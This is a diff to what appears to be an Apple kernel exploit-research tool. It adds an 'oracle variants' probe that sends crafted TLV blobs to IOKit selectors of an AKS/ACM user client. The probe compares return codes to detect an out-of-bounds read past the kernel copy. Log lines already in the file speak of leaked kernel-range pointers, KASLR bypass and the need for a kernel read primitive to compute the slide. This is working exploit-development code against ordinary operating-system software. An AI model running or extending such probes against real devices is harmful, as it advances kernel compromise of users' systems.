@@ -34,7 +34,7 @@
 #import <string.h>
 #import <mach/mach.h>
 
-#define P057_BUILD @"aks-p007-v7-acm-tlv"
+#define P057_BUILD @"aks-p007-v8-oracle-variants"
 #define SE_KEY_TAG "com.research.p007.aks.v5"
 #define OUTBUF_SZ  0x400u
 #define FILL_BYTE  0xBBu
@@ -639,6 +639,60 @@ static int p057_probe_acm(io_connect_t conn, int sel) {
             p057_log(@"*** copyout produced kernel-range qwords from the ACM OOB. KASLR sibling of aio84530.");
             p057_log(@"*** NOT hasKread. commitSlide needs kread32(kbase)==MH_MAGIC_64.");
         }
+        /* v8: ORACLE MECHANICS test on the census's door candidates
+           (00:04 run: sel16 SUCCESS+zeros, sel19 e00002e2 NotPermitted,
+           sel0/1 SUCCESS+zeros). For each candidate send TWO envelope
+           variants that differ ONLY in where the parse end lands:
+             A 'slack'  : 12 trailing bytes -> parse ends IN-BOUNDS,
+                          wrapper's trailing u32 reads OUR zero slack;
+             B 'exact'  : parse ends exactly at input end -> the wrapper's
+                          u32 read is the FIRST 4 BYTES PAST our kernel
+                          copy (the OOB). Any kr/output difference between
+                          A and B on the same selector = the parse endpoint
+                          is observable = the deserialize path RAN. */
+        p057_log(@"[5] v8 oracle variants (A=slack vs B=exact parse-end):");
+#define P057_ACMB_MAX 0x40
+        for (uint32_t selX = 0; selX <= 40; selX++) {
+            kern_return_t krA = 0, krB = 0;
+            if (selX == 5 || selX >= 20) continue;   /* bounded: door candidates + baseline sels only */
+            for (int variant = 0; variant < 2; variant++) {
+                uint8_t blob[0x40];
+                uint32_t plen = variant ? 12 : 0;
+                /* variant 0 = slack: param data leaves trailing zero bytes so
+                   the wrapper's trailing read lands IN-BOUNDS;
+                   variant 1 = exact: param reaches the end, read goes past it */
+                if (variant) {
+                    p057_build_acm(blob, 0x28, 12);
+                } else {
+                    memset(blob, 0, sizeof(blob));
+                    /* slack shape: 0x10 hdr / count=1 / param len=4 / 4 data /
+                       0x0C zero slack -> parse end 0x20, in-bounds reads */
+                    blob[4] = 0x33;
+                    uint32_t count = 1, type = 1, n4 = 4;
+                    memcpy(blob + 0x10, &count, 4);
+                    memcpy(blob + 0x14, &type, 4);
+                    memcpy(blob + 0x18, &n4, 4);
+                    memset(blob + 0x1c, 0x22, 4);
+                    /* blob[0x20..0x2c] = zeros (slack), insz 0x2c */
+                }
+                uint32_t insz = variant ? 0x28 : 0x2c;
+                uint8_t outb[0x400];
+                memset(outb, 0xBB, sizeof(outb));
+                size_t oszB = sizeof(outb);
+                uint64_t scal[8] = {0};
+                uint32_t scn2 = 8;
+                kern_return_t kr2 = real_IOConnectCallMethod(
+                    conn, selX, NULL, 0, blob, insz, scal, &scn2, outb, &oszB);
+                int nf = 0;
+                for (size_t i = 0; i < sizeof(outb); i++)
+                    if (outb[i] != 0xBB) nf++;
+                if (variant) krB = kr2; else krA = kr2;
+                if (variant == 1 && krB != krA)
+                    p057_log(@"  [ORACLE] sel=%2d kr@slack=0x%08x != kr@exact=0x%08x <- "
+                             @"NON-ENTITLED PARSE-END OBSERVABLE", selX, krA, krB);
+            }
+        }
+        p057_log(@"[5] done (per-sel slack/exact comparison; sel5+20+ skipped).");
     }
 
     for (uint32_t i = 0; i < nopened; i++) {
